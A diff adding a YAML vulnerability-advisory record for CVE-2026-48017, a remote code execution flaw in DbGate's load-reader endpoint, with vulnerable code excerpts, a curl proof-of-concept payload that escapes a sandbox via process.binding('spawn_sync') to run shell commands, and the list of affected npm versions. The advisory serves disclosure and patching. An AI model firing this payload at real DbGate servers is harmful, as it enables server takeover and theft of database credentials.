@@ -1,0 +1,421 @@
+advisory_id: GHSA-hv83-ggc4-v385
+datasource_id: github_osv/GHSA-hv83-ggc4-v385
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-hv83-ggc4-v385/GHSA-hv83-ggc4-v385.json
+aliases:
+  - CVE-2026-48017
+summary: |
+  DbGate: Remote Code Execution via functionName injection in loadReader endpoint
+  ### Summary
+
+  The `POST /runners/load-reader` endpoint in DbGate accepts a `functionName` parameter that is directly interpolated into a JavaScript code template without any sanitization or validation. An authenticated user (with basic access, no special permissions required) can inject arbitrary JavaScript code that executes on the server with full process privileges, bypassing the `require=null` sandbox restriction.
+
+  ### Details
+
+  The `loadReader` endpoint in `packages/api/src/controllers/runners.js` (line 353) takes a `functionName` parameter from the request body and passes it to `compileShellApiFunctionName()` which performs no sanitization:
+
+  **Vulnerable code** ([permalink](https://github.com/dbgate/dbgate/blob/ea3a61077ab09775c39890c465f0b3e97f6c812e/packages/api/src/controllers/runners.js#L352-L368)):
+
+  ```javascript
+    loadReader_meta: true,
+    async loadReader({ functionName, props }) {
+      if (!platformInfo.isElectron) {
+        if (props?.fileName && !checkSecureDirectories(props.fileName)) {
+          return { errorMessage: 'DBGM-00289 Unallowed file' };
+        }
+      }
+      const prefix = extractShellApiPlugins(functionName)
+        .map(packageName => `// @require ${packageName}\n`)
+        .join('');
+
+      const promise = new Promise((resolve, reject) => {
+        const runid = crypto.randomUUID();
+        this.requests[runid] = { resolve, reject, exitOnStreamError: true };
+        this.startCore(runid, loaderScriptTemplate(prefix, functionName, props, runid));
+      });
+      return promise;
+    },
+  ```
+
+  The `loaderScriptTemplate` at line 57-68 directly interpolates the compiled function name:
+
+  ```javascript
+  const loaderScriptTemplate = (prefix, functionName, props, runid) => `
+  ${prefix}
+  const dbgateApi = require(process.env.DBGATE_API);
+  dbgateApi.initializeApiEnvironment();
+  ${requirePluginsTemplate(extractShellApiPlugins(functionName, props))}
+  require=null;
+  async function run() {
+  const reader=await ${compileShellApiFunctionName(functionName)}(${JSON.stringify(props)});
+  const writer=await dbgateApi.collectorWriter({runid: '${runid}'});
+  await dbgateApi.copyStream(reader, writer);
+  }
+  dbgateApi.runScript(run);
+  `;
+  ```
+
+  The `compileShellApiFunctionName` in `packages/tools/src/packageTools.ts` (line 30-35) performs no validation:
+
+  ```typescript
+  export function compileShellApiFunctionName(functionName) {
+    const nsMatch = functionName.match(/^([^@]+)@([^@]+)/);
+    if (nsMatch) {
+      return `${_camelCase(nsMatch[2])}.shellApi.${nsMatch[1]}`;
+    }
+    return `dbgateApi.${functionName}`;
+  }
+  ```
+
+  **Two injection vectors:**
+  1. Without `@`: The entire `functionName` is appended after `dbgateApi.` without sanitization
+  2. With `@`: The part before `@` (`nsMatch[1]`) is appended after `.shellApi.` without sanitization (only the part after `@` goes through `_camelCase`)
+
+  Although the script template sets `require=null`, the `process` global is still available. `process.binding("spawn_sync")` provides direct access to spawn child processes, completely bypassing the sandbox.
+
+  **Compare with safe code in the same file** (line 292):
+
+  ```javascript
+    start_meta: true,
+    async start({ script }, req) {
+      // ...
+      await testStandardPermission('run-shell-script', req);  // <-- Permission check!
+      if (!platformInfo.allowShellScripting) {                 // <-- Platform check!
+        return { errorMessage: 'DBGM-00286 Shell scripting is not allowed' };
+      }
+      // ...
+    },
+  ```
+
+  The `start` endpoint requires the `run-shell-script` permission and checks `allowShellScripting`. The `loadReader` endpoint has **neither** of these checks, making it a privilege escalation from any authenticated user to full RCE.
+
+  ### PoC
+
+  An authenticated user sends a POST request to `/runners/load-reader` with a crafted `functionName`:
+
+  ```bash
+  # The malicious functionName breaks out of the expression and injects
+  # process.binding("spawn_sync") to execute arbitrary commands.
+  # The // at the end comments out the remaining template code.
+
+  curl -X POST http://TARGET:3000/runners/load-reader \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer <JWT_TOKEN>" \
+    -d '{
+      "functionName": "toString();var __r=process.binding(\"spawn_sync\").spawn({file:\"/bin/sh\",args:[\"/bin/sh\",\"-c\",\"id > /tmp/dbgate-rce-proof\"],envPairs:[],stdio:[{type:\"pipe\",readable:true,writable:false},{type:\"pipe\",readable:false,writable:true},{type:\"pipe\",readable:false,writable:true}]});dbgateApi.toString//",
+      "props": {}
+    }'
+  ```
+
+  This generates the following JavaScript that is forked as a child process:
+
+  ```javascript
+  const dbgateApi = require(process.env.DBGATE_API);
+  dbgateApi.initializeApiEnvironment();
+  require=null;
+  async function run() {
+  const reader=await dbgateApi.toString();var __r=process.binding("spawn_sync").spawn({file:"/bin/sh",args:["/bin/sh","-c","id > /tmp/dbgate-rce-proof"],envPairs:[],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true}]});dbgateApi.toString//({})
+  // ... rest of template
+  }
+  dbgateApi.runScript(run);
+  ```
+
+  After the request, `/tmp/dbgate-rce-proof` contains the output of `id`, confirming arbitrary command execution.
+
+  A standalone PoC script is available at: `reports/cve-hunting/pocs/dbgate/rce_loadreader_functionname_injection.py`
+
+  ### Impact
+
+  An authenticated user with **basic access** (no admin role, no `run-shell-script` permission required) can:
+
+  1. **Execute arbitrary OS commands** on the DbGate server with the privileges of the Node.js process
+  2. **Read/write any file** accessible to the process
+  3. **Pivot to connected databases** by reading connection credentials from DbGate's storage
+  4. **Compromise the host system** - in Docker deployments, this typically means root access within the container
+
+  This is particularly severe because:
+  - No special permissions are required beyond basic authentication
+  - The `require=null` sandbox is completely bypassed via `process.binding("spawn_sync")`
+  - The `loadReader` endpoint lacks the permission checks present on the `start` endpoint
+  - DbGate is commonly deployed as a web-accessible database management tool
+impacted_packages:
+  - purl: pkg:npm/dbgate-api
+    affected_versions: vers:npm/<=7.1.8
+    fixed_versions: vers:npm/7.1.9
+    affected_packages:
+      - pkg:npm/dbgate-api@1.0.0
+      - pkg:npm/dbgate-api@1.0.1
+      - pkg:npm/dbgate-api@1.0.2
+      - pkg:npm/dbgate-api@1.0.3
+      - pkg:npm/dbgate-api@1.0.4
+      - pkg:npm/dbgate-api@1.0.5
+      - pkg:npm/dbgate-api@1.0.6
+      - pkg:npm/dbgate-api@1.0.7
+      - pkg:npm/dbgate-api@3.9.6-alpha.7
+      - pkg:npm/dbgate-api@3.9.6-alpha.8
+      - pkg:npm/dbgate-api@3.9.6-alpha.9
+      - pkg:npm/dbgate-api@3.9.6-alpha.10
+      - pkg:npm/dbgate-api@3.9.6-alpha.11
+      - pkg:npm/dbgate-api@3.9.6-alpha.12
+      - pkg:npm/dbgate-api@3.9.6-alpha.13
+      - pkg:npm/dbgate-api@3.9.6-alpha.14
+      - pkg:npm/dbgate-api@3.9.6
+      - pkg:npm/dbgate-api@4.0.0
+      - pkg:npm/dbgate-api@4.0.1
+      - pkg:npm/dbgate-api@4.0.2
+      - pkg:npm/dbgate-api@4.0.3
+      - pkg:npm/dbgate-api@4.1.0
+      - pkg:npm/dbgate-api@4.1.1
+      - pkg:npm/dbgate-api@4.1.3
+      - pkg:npm/dbgate-api@4.1.4
+      - pkg:npm/dbgate-api@4.1.5
+      - pkg:npm/dbgate-api@4.1.6
+      - pkg:npm/dbgate-api@4.1.7
+      - pkg:npm/dbgate-api@4.1.8
+      - pkg:npm/dbgate-api@4.1.9
+      - pkg:npm/dbgate-api@4.1.10
+      - pkg:npm/dbgate-api@4.1.11
+      - pkg:npm/dbgate-api@4.1.12
+      - pkg:npm/dbgate-api@4.2.0
+      - pkg:npm/dbgate-api@4.2.1
+      - pkg:npm/dbgate-api@4.2.2
+      - pkg:npm/dbgate-api@4.2.3
+      - pkg:npm/dbgate-api@4.2.4
+      - pkg:npm/dbgate-api@4.2.5
+      - pkg:npm/dbgate-api@4.2.6
+      - pkg:npm/dbgate-api@4.2.7
+      - pkg:npm/dbgate-api@4.2.8
+      - pkg:npm/dbgate-api@4.3.0
+      - pkg:npm/dbgate-api@4.3.1
+      - pkg:npm/dbgate-api@4.3.2
+      - pkg:npm/dbgate-api@4.3.3
+      - pkg:npm/dbgate-api@4.3.4
+      - pkg:npm/dbgate-api@4.4.0-alpha.1
+      - pkg:npm/dbgate-api@4.4.0-alpha.2
+      - pkg:npm/dbgate-api@4.4.0
+      - pkg:npm/dbgate-api@4.4.1
+      - pkg:npm/dbgate-api@4.4.2
+      - pkg:npm/dbgate-api@4.4.3
+      - pkg:npm/dbgate-api@4.4.4
+      - pkg:npm/dbgate-api@4.4.5-alpha.1
+      - pkg:npm/dbgate-api@4.5.0
+      - pkg:npm/dbgate-api@4.5.1
+      - pkg:npm/dbgate-api@4.6.0
+      - pkg:npm/dbgate-api@4.6.1
+      - pkg:npm/dbgate-api@4.6.2
+      - pkg:npm/dbgate-api@4.6.3
+      - pkg:npm/dbgate-api@4.7.0
+      - pkg:npm/dbgate-api@4.7.1
+      - pkg:npm/dbgate-api@4.7.2
+      - pkg:npm/dbgate-api@4.7.3-alpha.2
+      - pkg:npm/dbgate-api@4.7.3-alpha.3
+      - pkg:npm/dbgate-api@4.7.3-alpha.5
+      - pkg:npm/dbgate-api@4.7.3
+      - pkg:npm/dbgate-api@4.7.4-alpha.1
+      - pkg:npm/dbgate-api@4.7.4-alpha.2
+      - pkg:npm/dbgate-api@4.7.4-alpha.3
+      - pkg:npm/dbgate-api@4.7.4-alpha.7
+      - pkg:npm/dbgate-api@4.7.4-alpha.8
+      - pkg:npm/dbgate-api@4.7.4-alpha.10
+      - pkg:npm/dbgate-api@4.7.4-alpha.12
+      - pkg:npm/dbgate-api@4.7.4-alpha.14
+      - pkg:npm/dbgate-api@4.7.4-alpha.15
+      - pkg:npm/dbgate-api@4.7.4-alpha.16
+      - pkg:npm/dbgate-api@4.7.4
+      - pkg:npm/dbgate-api@4.8.0
+      - pkg:npm/dbgate-api@4.8.1
+      - pkg:npm/dbgate-api@4.8.2
+      - pkg:npm/dbgate-api@4.8.3
+      - pkg:npm/dbgate-api@4.8.4
+      - pkg:npm/dbgate-api@4.8.5
+      - pkg:npm/dbgate-api@4.8.6
+      - pkg:npm/dbgate-api@4.8.7
+      - pkg:npm/dbgate-api@4.8.8
+      - pkg:npm/dbgate-api@5.0.0-alpha.1
+      - pkg:npm/dbgate-api@5.0.0
+      - pkg:npm/dbgate-api@5.0.1
+      - pkg:npm/dbgate-api@5.0.2
+      - pkg:npm/dbgate-api@5.0.3
+      - pkg:npm/dbgate-api@5.0.4-alpha.2
+      - pkg:npm/dbgate-api@5.0.4-alpha.7
+      - pkg:npm/dbgate-api@5.0.4-alpha.8
+      - pkg:npm/dbgate-api@5.0.4
+      - pkg:npm/dbgate-api@5.0.5
+      - pkg:npm/dbgate-api@5.0.6-alpha.2
+      - pkg:npm/dbgate-api@5.0.6
+      - pkg:npm/dbgate-api@5.0.7
+      - pkg:npm/dbgate-api@5.0.8
+      - pkg:npm/dbgate-api@5.0.9
+      - pkg:npm/dbgate-api@5.1.0
+      - pkg:npm/dbgate-api@5.1.1
+      - pkg:npm/dbgate-api@5.1.2
+      - pkg:npm/dbgate-api@5.1.3
+      - pkg:npm/dbgate-api@5.1.4
+      - pkg:npm/dbgate-api@5.1.5
+      - pkg:npm/dbgate-api@5.1.6
+      - pkg:npm/dbgate-api@5.1.7-alpha.13
+      - pkg:npm/dbgate-api@5.1.7-alpha.14
+      - pkg:npm/dbgate-api@5.2.0
+      - pkg:npm/dbgate-api@5.2.1
+      - pkg:npm/dbgate-api@5.2.2-alpha.11
+      - pkg:npm/dbgate-api@5.2.2-alpha.12
+      - pkg:npm/dbgate-api@5.2.2-alpha.13
+      - pkg:npm/dbgate-api@5.2.2
+      - pkg:npm/dbgate-api@5.2.3
+      - pkg:npm/dbgate-api@5.2.4-alpha.1
+      - pkg:npm/dbgate-api@5.2.4
+      - pkg:npm/dbgate-api@5.2.5
+      - pkg:npm/dbgate-api@5.2.6
+      - pkg:npm/dbgate-api@5.2.7-alpha.1
+      - pkg:npm/dbgate-api@5.2.7
+      - pkg:npm/dbgate-api@5.2.8
+      - pkg:npm/dbgate-api@5.2.9
+      - pkg:npm/dbgate-api@5.3.0
+      - pkg:npm/dbgate-api@5.3.1
+      - pkg:npm/dbgate-api@5.3.3
+      - pkg:npm/dbgate-api@5.3.4
+      - pkg:npm/dbgate-api@5.4.0
+      - pkg:npm/dbgate-api@5.4.1
+      - pkg:npm/dbgate-api@5.4.2
+      - pkg:npm/dbgate-api@5.4.3
+      - pkg:npm/dbgate-api@5.4.4
+      - pkg:npm/dbgate-api@5.4.5-alpha.3
+      - pkg:npm/dbgate-api@5.4.5-alpha.4
+      - pkg:npm/dbgate-api@5.4.5-alpha.5
+      - pkg:npm/dbgate-api@5.5.0
+      - pkg:npm/dbgate-api@5.5.1
+      - pkg:npm/dbgate-api@5.5.2
+      - pkg:npm/dbgate-api@5.5.3
+      - pkg:npm/dbgate-api@5.5.4-alpha.1
+      - pkg:npm/dbgate-api@5.5.4-alpha.2
+      - pkg:npm/dbgate-api@5.5.4-alpha.3
+      - pkg:npm/dbgate-api@5.5.4-alpha.4
+      - pkg:npm/dbgate-api@5.5.4-alpha.7
+      - pkg:npm/dbgate-api@5.5.4-alpha.8
+      - pkg:npm/dbgate-api@5.5.4
+      - pkg:npm/dbgate-api@5.5.5
+      - pkg:npm/dbgate-api@5.5.6
+      - pkg:npm/dbgate-api@5.5.7-alpha.16
+      - pkg:npm/dbgate-api@5.5.7-alpha.25
+      - pkg:npm/dbgate-api@5.5.7-alpha.26
+      - pkg:npm/dbgate-api@5.5.7-alpha.27
+      - pkg:npm/dbgate-api@5.5.7-alpha.28
+      - pkg:npm/dbgate-api@5.5.7-alpha.29
+      - pkg:npm/dbgate-api@5.5.7-alpha.32
+      - pkg:npm/dbgate-api@5.5.7-alpha.33
+      - pkg:npm/dbgate-api@5.5.7-alpha.40
+      - pkg:npm/dbgate-api@5.5.7-alpha.43
+      - pkg:npm/dbgate-api@5.5.7-alpha.44
+      - pkg:npm/dbgate-api@5.5.7-alpha.45
+      - pkg:npm/dbgate-api@5.5.7-alpha.47
+      - pkg:npm/dbgate-api@5.5.7-alpha.48
+      - pkg:npm/dbgate-api@5.5.7-alpha.50
+      - pkg:npm/dbgate-api@5.5.7-alpha.51
+      - pkg:npm/dbgate-api@5.5.7-alpha.52
+      - pkg:npm/dbgate-api@5.5.7-alpha.53
+      - pkg:npm/dbgate-api@5.5.7-alpha.60
+      - pkg:npm/dbgate-api@5.5.7-alpha.68
+      - pkg:npm/dbgate-api@6.0.0-alpha.1
+      - pkg:npm/dbgate-api@6.0.0
+      - pkg:npm/dbgate-api@6.1.0
+      - pkg:npm/dbgate-api@6.1.1
+      - pkg:npm/dbgate-api@6.1.2
+      - pkg:npm/dbgate-api@6.1.3
+      - pkg:npm/dbgate-api@6.1.4
+      - pkg:npm/dbgate-api@6.1.5
+      - pkg:npm/dbgate-api@6.1.6
+      - pkg:npm/dbgate-api@6.2.0
+      - pkg:npm/dbgate-api@6.2.1
+      - pkg:npm/dbgate-api@6.3.0
+      - pkg:npm/dbgate-api@6.3.2
+      - pkg:npm/dbgate-api@6.3.3
+      - pkg:npm/dbgate-api@6.4.0
+      - pkg:npm/dbgate-api@6.4.1
+      - pkg:npm/dbgate-api@6.4.2
+      - pkg:npm/dbgate-api@6.4.3-alpha.1
+      - pkg:npm/dbgate-api@6.5.0
+      - pkg:npm/dbgate-api@6.5.1
+      - pkg:npm/dbgate-api@6.5.2
+      - pkg:npm/dbgate-api@6.5.3
+      - pkg:npm/dbgate-api@6.5.4
+      - pkg:npm/dbgate-api@6.5.5
+      - pkg:npm/dbgate-api@6.5.6
+      - pkg:npm/dbgate-api@6.6.0
+      - pkg:npm/dbgate-api@6.6.1
+      - pkg:npm/dbgate-api@6.6.2
+      - pkg:npm/dbgate-api@6.6.3
+      - pkg:npm/dbgate-api@6.6.4
+      - pkg:npm/dbgate-api@6.6.5
+      - pkg:npm/dbgate-api@6.6.6
+      - pkg:npm/dbgate-api@6.6.7
+      - pkg:npm/dbgate-api@6.6.8-alpha.5
+      - pkg:npm/dbgate-api@6.6.8-alpha.6
+      - pkg:npm/dbgate-api@6.6.8-alpha.7
+      - pkg:npm/dbgate-api@6.6.8-alpha.8
+      - pkg:npm/dbgate-api@6.6.8-alpha.9
+      - pkg:npm/dbgate-api@6.6.8-alpha.10
+      - pkg:npm/dbgate-api@6.6.8
+      - pkg:npm/dbgate-api@6.6.9
+      - pkg:npm/dbgate-api@6.6.10
+      - pkg:npm/dbgate-api@6.6.11
+      - pkg:npm/dbgate-api@6.6.12
+      - pkg:npm/dbgate-api@6.7.0
+      - pkg:npm/dbgate-api@6.7.1
+      - pkg:npm/dbgate-api@6.7.2-alpha.1
+      - pkg:npm/dbgate-api@6.7.2
+      - pkg:npm/dbgate-api@6.7.3
+      - pkg:npm/dbgate-api@6.8.0
+      - pkg:npm/dbgate-api@6.8.1
+      - pkg:npm/dbgate-api@6.8.2
+      - pkg:npm/dbgate-api@7.0.0-alpha.10
+      - pkg:npm/dbgate-api@7.0.0-alpha.12
+      - pkg:npm/dbgate-api@7.0.0
+      - pkg:npm/dbgate-api@7.0.1
+      - pkg:npm/dbgate-api@7.0.2
+      - pkg:npm/dbgate-api@7.0.3
+      - pkg:npm/dbgate-api@7.0.4
+      - pkg:npm/dbgate-api@7.0.6
+      - pkg:npm/dbgate-api@7.1.0
+      - pkg:npm/dbgate-api@7.1.1
+      - pkg:npm/dbgate-api@7.1.2
+      - pkg:npm/dbgate-api@7.1.3-alpha.1
+      - pkg:npm/dbgate-api@7.1.3-alpha.2
+      - pkg:npm/dbgate-api@7.1.3-alpha.3
+      - pkg:npm/dbgate-api@7.1.3
+      - pkg:npm/dbgate-api@7.1.4-alpha.1
+      - pkg:npm/dbgate-api@7.1.4-alpha.2
+      - pkg:npm/dbgate-api@7.1.4
+      - pkg:npm/dbgate-api@7.1.5
+      - pkg:npm/dbgate-api@7.1.6
+      - pkg:npm/dbgate-api@7.1.8-alpha.7
+      - pkg:npm/dbgate-api@7.1.8
+    fixed_packages:
+      - pkg:npm/dbgate-api@7.1.9
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-hv83-ggc4-v385/GHSA-hv83-ggc4-v385.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/dbgate/dbgate
+    reference_type:
+    reference_id:
+  - url: https://github.com/dbgate/dbgate/releases/tag/v7.1.9
+    reference_type:
+    reference_id:
+  - url: https://github.com/dbgate/dbgate/security/advisories/GHSA-hv83-ggc4-v385
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-48017
+    reference_type:
+    reference_id: CVE-2026-48017
+exploits: []
